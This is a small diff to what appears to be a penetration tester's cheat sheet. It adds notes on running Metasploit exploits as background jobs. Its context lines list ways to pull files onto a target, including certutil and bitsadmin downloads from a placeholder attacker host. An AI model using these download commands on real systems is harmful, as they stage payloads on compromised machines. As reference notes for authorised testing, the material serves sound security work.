@@ -15,3 +15,8 @@
     metasploit: upload <your dir> <target dir>
     certutil -urlcache -split -f http://<your ip>/ <target dir>
     bitsadmin /Transfer myJob http://<your ip>/ <target dir>
+
+# Metasploit
+    When need Multi jobs:
+        exploit -j
+        jobs
